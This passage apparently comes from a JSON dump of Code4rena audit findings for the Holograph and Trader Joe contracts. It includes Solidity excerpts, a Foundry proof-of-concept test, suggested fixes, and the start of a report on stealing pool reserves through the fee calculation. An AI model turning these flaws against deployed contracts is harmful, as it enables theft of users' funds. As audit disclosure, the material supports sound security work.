https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L920 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L924 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L928 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L932   # Vulnerability details  ## Impact  When user call unbondUtilityToken to unstake the token,   the function read the available bonded amount, and transfer back to the operator  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L899  ```solidity /**  * @dev get current bonded amount by operator  */ uint256 amount = _bondedAmounts[operator]; /**  * @dev unset operator bond amount before making a transfer  */ _bondedAmounts[operator] = 0; /**  * @dev remove all operator references  */ _popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]); /**  * @dev transfer tokens to recipient  */ require(_utilityToken().transfer(recipient, amount), \"HOLOGRAPH: token transfer failed\"); ```  the logic is clean, but does not conform to the buisness requirement in the documentation, the doc said  https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection  >To move to a different pod, an Operator must withdraw and re-bond HLG. Operators who withdraw HLG will be charged a 0.1% fee, the proceeds of which will be burned or returned to the Treasury.  The charge 0.1% fee is not implemented in the code.  there are two incentive for bounded operator to stay,  the first is the reward incentive, the second is to avoid penalty with unbonding.  Without chargin the unstaking fee, the second incentive is weak and the operator can unbound or bond whenver they want  ## Proof of Concept  https://docs.holograph.xyz/holograph-protocol/operator-network-specification#operator-job-selection  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  we recommend charge the 0.1% unstaking fee to make the code align with the busienss requirement in the doc.  ```solidity /**  * @dev get current bonded amount by operator  */ uint256 amount = _bondedAmounts[operator]; uint256 fee = chargedFee(amount); // here amount -= fee;   /**  * @dev unset operator bond amount before making a transfer  */ _bondedAmounts[operator] = 0; /**  * @dev remove all operator references  */ _popOperator(_bondedOperators[operator] - 1, _operatorPodIndex[operator]); /**  * @dev transfer tokens to recipient  */ require(_utilityToken().transfer(recipient, amount), \"HOLOGRAPH: token transfer failed\"); ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/140", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/RaymondFam-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/136", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/zishansami-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/132", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/sakman-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Saintcode_-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/128", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/fatherOfBlocks-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/127", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/exolorkistis-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/116", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/mcwildy-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/114", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/adriro-G.md)."}, {"title": "Failed job can't be recovered. NFT may be lost.", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/102", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed", "selected for report", "edited-by-warden", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L329 https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L419-L429   # Vulnerability details  ## Impact Failed job can't be recovered. NFT may be lost.  ## Proof of Concept ```solidity function executeJob(bytes calldata bridgeInRequestPayload) external payable { ... delete _operatorJobs[hash]; ...     try       HolographOperatorInterface(address(this)).nonRevertingBridgeCall{value: msg.value}(         msg.sender,         bridgeInRequestPayload       )     {       /// @dev do nothing     } catch {       _failedJobs[hash] = true;       emit FailedOperatorJob(hash);     } } ```  First, it will `delete _operatorJobs[hash];` to have it not replayable.  Next, assume nonRevertingBridgeCall failed. NFT won't be minted and the catch block is entered.  _failedJobs[hash] is set to true and event is emitted  Notice that _operatorJobs[hash] has been deleted, so this job is not replayable. This mean NFT is lost forever since we can't retry executeJob.  ## Recommended Mitigation Steps Move `delete _operatorJobs[hash];` to the end of function executeJob covered in `if (!_failedJobs[hash])`  ```solidity ... if (!_failedJobs[hash]) delete _operatorJobs[hash]; ... ```  But this implementation is not safe. The selected operator may get slashed. Additionally, you may need to check _failedJobs flag to allow retry for only the selected operator."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/101", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/0x1f8b-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/87", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/bobirichman-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/75", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Picodes-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/73", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/RedOneN-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/RedOneN-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Rolezn-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/68", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "selected for report", "edited-by-warden", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Rolezn-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Satyam_Sharma-G.md)."}, {"title": "Contract ERC20H lacks withdraw functions", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/55", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/main/contracts/abstract/ERC20H.sol#L106-L229   # Vulnerability details  ## Impact Contract ERC20H has payable functions (receive(), fallback(), etc.), but does not have a function to withdraw, therefore, every Ether sent to HolographERC20 will be lost.  ## Proof of Concept Contract functions and structure illustrate the concept.  ## Tools Used Slither  ## Recommended Mitigation Steps Remove the payable attribute or add a withdraw function."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/50", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/KoKo-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/49", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/KoKo-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/47", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/gogo-G.md)."}, {"title": "Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/44", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "selected for report", "edited-by-warden", "responded"], "target": "2022-10-holograph-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographOperator.sol#L354   # Vulnerability details  ## Impact Gas price spikes cause the selected operator to be vulnerable to frontrunning and be slashed.  ## Proof of Concept ```solidity require(gasPrice >= tx.gasprice, \"HOLOGRAPH: gas spike detected\"); ```  ```solidity         /**          * @dev select operator that failed to do the job, is slashed the pod base fee          */         _bondedAmounts[job.operator] -= amount;         /**          * @dev the slashed amount is sent to current operator          */         _bondedAmounts[msg.sender] += amount; ```  Since you have designed a mechanism to prevent other operators to slash the operator due to \"the selected missed the time slot due to a gas spike\". It can induce that operators won't perform their job if a gas price spike happens due to negative profit.  But your designed mechanism has a vulnerability. Other operators can submit their transaction to the mempool and queue it using `gasPrice in bridgeInRequestPayload`. It may get executed before the selected operator as the selected operator is waiting for the gas price to drop but doesn't submit any transaction yet. If it doesn't, these operators lose a little gas fee. But a slashed reward may be greater than the risk of losing a little gas fee.  ```solidity require(timeDifference > 0, \"HOLOGRAPH: operator has time\"); ```  Once 1 epoch has passed, selected operator is vulnerable to slashing and frontrunning.  ## Recommended Mitigation Steps Modify your operator node software to queue transactions immediately with `gasPrice in bridgeInRequestPayload` if a gas price spike happened. Or allow gas fee loss tradeoff to prevent being slashed."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/38", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/gianganhnguyen-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/36", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/csanuragjain-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Mathieu-G.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/durianSausage-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/17", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Bnke0x0-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/16", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "responded", "grade-a"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/Bnke0x0-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/3", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/leosathya-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-holograph-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "responded", "grade-b"], "target": "2022-10-holograph-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2022-10-holograph-findings/blob/main/data/leosathya-G.md)."}, {"title": "Incorrect fee calculation on LBPair (fees collected on swaps are less than what they \"should\" be)", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/470", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "sponsor confirmed", "selected for report", "M-07"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L329-L330 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBRouter.sol#L124-L125   # Vulnerability details  # LBPair contracts consistently collect less fees than their FeeParameters --- ## Github and source code  https://github.com/sha256yan/incorrect-fee --- ## Motivation and Severity  LBpair contracts' fees fall short by 0.1% on single bin with the deficit growing exponentially with multi-bin swaps.   This report will refer to this difference in fees, that is, the difference between the expected fees and the actual collected fees as the \"Fee Deficit\".   ![feeDeficitGrowth](https://user-images.githubusercontent.com/91401566/197405701-e6df80c4-dcdf-44f5-9fd2-74ef1c66b954.png)  The exponential growth of the Fee Deficit percentage is concerning, considering that the vast majority of the fees collected by LPs and DEXs are during high volatility periods. Note that the peak Fee Deficit percentage of 1.6% means that 1.6% of expected fees would not be collected.     https://user-images.githubusercontent.com/91401566/197406096-5771893b-82f6-43e8-aa42-ccda449e4936.mov  With an assumed average total fee of 1% (higher than usual due to ```variableFee``` component) and average Fee Deficit percentage of 0.4%; The total Fee Deficit from a period similar to May 7th 2022 - May 14th 2022, with approximately \\$1.979B in trading volume, would be $***79,160*** over one week.     [SwapHelper.getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65) carries most of the blame for this error.   3 main causes have been identified and will be discussed in this report. - [Incorrect use of getFeeAmountFrom](#incorrect-use-of-getfeeamountfrom) - [Incorrect conditional for amountIn overflow](#incorrect-conditional-for-amountin-overflow) - [Need for an additional FeeHelper function](#need-for-an-additional-feehelper-function)   ---      ### Affected contracts and libraries  - LBPair.sol   - [swap](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L304-L330)  - LBRouter.sol   - [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125)   - [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169)  - SwapHelper.sol   - [getAmounts](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L59-L65)   ---  ### Proposed changes  - FeeHelper.sol   - [getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/libraries/FeeHelper.sol#L164-L173) ( ***New*** )   - SwapHelper.sol   - [getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L118-L126) ( ***New*** )  - LBRouter.sol   - [getSwapIn](https://github.com/sha256yan/incorrect-fee/blob/716cddf2583da86674376cb5346bf46b701b242c/test/mocks/correctFee/LBRouterV2.sol#L124-L125) ( ***Modified*** )   - [getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/c1719b8429c7d25e4e12fc4632842285a2eaaf8b/test/mocks/correctFee/LBRouterV2.sol#L168-L169) ( ***Modified*** )  - LBPair.sol   - [swap](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/test/mocks/correctFee/LBPair.sol#L332-L333)  ( ***Modified*** )  ---  ### Details - As mentioned earlier, most issues arise from SwapHelper.getAmounts . The SwapHelper library is often used for the Bin type. ([Example in LBPair](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L36)). The proposed solution includes the new functions [SwapHelper.getAmountsV2](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/SwapHelper.sol#L76-L133) and [FeeHelper.getAmountInWithFees](https://github.com/sha256yan/incorrect-fee/blob/48b5caee818c1befb5733c3f96e415ca14a67bf2/src/libraries/FeeHelper.sol#L164-L173). - LBPair.swap uses _bin.getAmounts(...) on the active bin to calculate fees. ([See here](https://github.com/sha256yan/incorrect-fee/blob/dc355df9ee61a41185dedd7017063fc508584f24/src/LBPair.sol#L329-L330)) - Inside of SwapHelper.getAmounts, for a given swap, if a bin has enough liqudity, the fee is calculated using ([FeeHelper.getFeeAmountFrom](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/libraries/SwapHelper.sol#L65)). This results in smaller than expected fees.  - LBRouter.getSwapOut relies on SwapHelper.getAmounts to simulate swaps. Its simulations adjust to the correct fee upon using SwapHelper.getAmountsV2 ([LBRouter.getSwapOut](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125), [SwapHelper.getAmounts](), [SwapHelper.getAmountsV2]()) - LBRouter.getSwapIn has a fee calculation error which is independent of SwapHelper.getAmounts. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L168-L169)) - As of right now the LBPair.swap using getAmountsV2 uses 3.8% ***more*** gas.  ![LBPair comparison](https://user-images.githubusercontent.com/91401566/197410772-e3f1cb99-7181-48f7-a56a-2430176a92ff.png)   ---   # Incorrect use of getFeeAmountFrom - When there is enough liquidity in a bin for a swap, we should use FeeHelper.getFeeAmount(amountIn) instead of FeeHelper.getFeeAmountFrom(amountIn).  ### Evidence - amountIn, the parameter passed to calculate fees, is the amount of tokens in the LBPair contract in excess of the reserves and fees of the pair for that token. [Inside LBPair.sol](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/LBPair.sol#L312-L314) --- [Inside TokenHelper](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/TokenHelper.sol#L59-L69)   Will now use example numbers: - Let amountIn = 1e10 (meaning the user has transferred/minted 1e10 tokens to the LBPair) - Let PRECISION = 1e18 - Let totalFee =  0.00125 x precision (fee of 0.0125%) - Let price = 1 (parity) - If the current bin has enough liqudity, feeAmount must be: (amountIn * totalFee ) / (PRECISION) = 12500000  - [FeeHelper.getFeeAmountFrom(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L124-L126) uses the formula: feeAmount = (amountIn * totalFee) / (PRECISION + totalFee) = 12484394 - [FeeHelper.getFeeAmount(amountIn)](https://github.com/sha256yan/incorrect-fee/blob/1396f6c07ae91bfe5833fd629357983432a97f8b/src/libraries/FeeHelper.sol#L116-L118) uses exactly the formula ourlined in the correct feeAmount calculation and is the correct method in this case. - Visit the tests section to run a test.    ---   # Incorrect condition for amountIn overflow - The [condition](https://github.com/sha256yan/incorrect-fee/blob/348b00988d377d96c9ad64917413524815739884/src/libraries/SwapHelper.sol#L61) for when an amountIn overflows the maximum amount available in a bin is flawed. - The Fee Deficit here could potentially trigger an unnecessary bin de-activation.  ### Evidence #### Snippet 1 (SwapHelper.getAmounts)  ```         fees = fp.getFeeAmountDistribution(fp.getFeeAmount(_maxAmountInToBin));          if (_maxAmountInToBin + fees.total <= amountIn) {             //do things         } ``` - Collecting the fees on ```_maxAmountInToBin``` before doing so on ```amountIn``` means we are not checking  to see whether ```amountIn``` after   Consider the following: #### Snippet 2 (SwapHelper.getAmountsV2) ```         fees = fp.getFeeAmountDistribution(fp.getFeeAmount(amountIn));          if (_maxAmountInToBin <  amountIn - fees.total) {             //do things         } ``` - Now, the fees are collected on ```amountIn```. - Assuming both conditions are true, the fees from Snippet2 will be necessarily larger than those in Snippet1 since in both cases ``` _maxAmountInToBin <  amountIn ```. - Snippet 1 produces false positives. Meaning, SwapHelper.getAmounts changes its active bin id more than needed. (See Tests section at the bottom for the relevant test)    ---     # Need for an additional FeeHelper function - There are currently functions to answer the following question: How many tokens must a user send, to end up with a given amountInToBin after fees, before the swap itself takes place?  ### Evidence - ```LBRouter.getSwapIn(, amountOut, )``` needs this question answered. At a given price, how many tokens must a user send, to receive ```amountOut```?   - We use the ```amountOut``` and price to work backwards to the ```amountInToBin```.   - Current approach calculates fees on ```amountInToBin```. ([See here](https://github.com/sha256yan/incorrect-fee/blob/899b2318b7d368dbb938a0f1b56748eb0ac3442a/src/LBRouter.sol#L124-L125))   - This is incorrect as fees should be calculated on ```amountIn```. (As we discussed in [Incorrect use of getFeeAmountFrom](#incorrect-use-of-getfeeamountfrom))   - SwapHelper.getAmounts needs to know what hypothetical ```amountIn``` would end up as ```maxAmountInToBin``` after fees. This is needed to be able to avoid [Incorrect amountIn overflow](#incorrect-conditional-for-amountin-overflow)   ---   ## Install dependencies  To install dependencies, run the following to install dependencies:  ``` forge install ```  ___  ## Tests  To run tests, run the following command:  ``` forge test --match-contract Report -vv ``` --- ## testSingleBinSwapFeeDifference: - Simple test to show the Fee Defecit in it's most basic form. --- ## testFalsePositiveBinDeactivation - Test that shows false positive resulting from the [Incorrect condition](#incorrect-conditional-for-amountin-overflow) --- #### testCorrectFeeBinDeactivation - Test that shows with getAmountsV2 the false positive issue is resolved. --- ### testMultiBinGrowth - Generates datapoints used in opening graph. "}, {"title": "Calling `swapAVAXForExactTokens` function while sending excess amount cannot refund such excess amount", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/469", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "sponsor confirmed", "selected for report", "M-06"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521   # Vulnerability details  ## Impact When calling the `swapAVAXForExactTokens`  function, `if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value)` is executed, which is for refunding any excess amount sent in; this is confirmed by this function's comment as well. However, executing `amountsIn[0] - msg.value` will always revert when `msg.value > amountsIn[0]` is true. Developers who has the design of the `swapAVAXForExactTokens` function in mind could develop front-ends and contracts that will send excess amount when calling the `swapAVAXForExactTokens` function. Hence, the users, who rely on these front-ends and contracts for interacting with the `swapAVAXForExactTokens` function will always find such interactions being failed since calling this function with the excess amount will always revert. As a result, the user experience becomes degraded, and the usability of the protocol becomes limited.  https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L485-L521 ```solidity     /// @notice Swaps AVAX for exact tokens while performing safety checks     /// @dev will refund any excess sent     ...     function swapAVAXForExactTokens(         uint256 _amountOut,         uint256[] memory _pairBinSteps,         IERC20[] memory _tokenPath,         address _to,         uint256 _deadline     )         external         payable         override         ensure(_deadline)         verifyInputs(_pairBinSteps, _tokenPath)         returns (uint256[] memory amountsIn)     {         ...          if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, amountsIn[0] - msg.value);     } ```  ## Proof of Concept Please add the following test in `test\\LBRouter.Swaps.t.sol`. This test will pass to demonstrate the described scenario. ```solidity     function testSwapAVAXForExactTokensIsUnableToRefund() public {         uint256 amountOut = 1e18;          (uint256 amountIn, ) = router.getSwapIn(pairWavax, amountOut, false);          IERC20[] memory tokenList = new IERC20[](2);         tokenList[0] = wavax;         tokenList[1] = token6D;         uint256[] memory pairVersions = new uint256[](1);         pairVersions[0] = DEFAULT_BIN_STEP;          vm.deal(DEV, amountIn + 500);          // Although the swapAVAXForExactTokens function supposes to refund any excess sent,         //   calling it reverts when sending more than amountIn         //   because executing _safeTransferAVAX(_to, amountsIn[0] - msg.value) results in arithmetic underflow         vm.expectRevert(stdError.arithmeticError);         router.swapAVAXForExactTokens{value: amountIn + 1}(amountOut, pairVersions, tokenList, DEV, block.timestamp);     } ```  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L520 can be updated to the following code. ```solidity         if (msg.value > amountsIn[0]) _safeTransferAVAX(_to, msg.value - amountsIn[0]); ```"}, {"title": "Attacker can steal entire reserves by abusing fee calculation", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/423", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-05"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBPair.sol#L819-L829 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L202   # Vulnerability details  ## Description  Similar to other LP pools, In Trader Joe users can call mint() to provide liquidity and receive LP tokens, and burn() to return their LP tokens in exchange for underlying assets. Users collect fees using collectFess(account,binID). Fees are implemented using debt model. The fundamental fee calculation is:  ```     function _getPendingFees(         Bin memory _bin,         address _account,         uint256 _id,         uint256 _balance     ) private view returns (uint256 amountX, uint256 amountY) {         Debts memory _debts = _accruedDebts[_account][_id];          amountX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtX;         amountY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET) - _debts.debtY;     } ```  accTokenXPerShare / accTokenYPerShare is an ever increasing amount that is updated when swap fees are paid to the current active bin.  When liquidity is first minted to user, the \\_accruedDebts is updated to match current \\_balance * accToken\\*PerShare. Without this step, user could collect fees for the entire growth of accToken\\*PerShare from zero to current value. This is done in \\_updateUserDebts, called by \\_cacheFees() which is called by \\_beforeTokenTransfer(), the token transfer hook triggered on mint/burn/transfer.  ```     function _updateUserDebts(         Bin memory _bin,         address _account,         uint256 _id,         uint256 _balance     ) private {         uint256 _debtX = _bin.accTokenXPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);         uint256 _debtY = _bin.accTokenYPerShare.mulShiftRoundDown(_balance, Constants.SCALE_OFFSET);          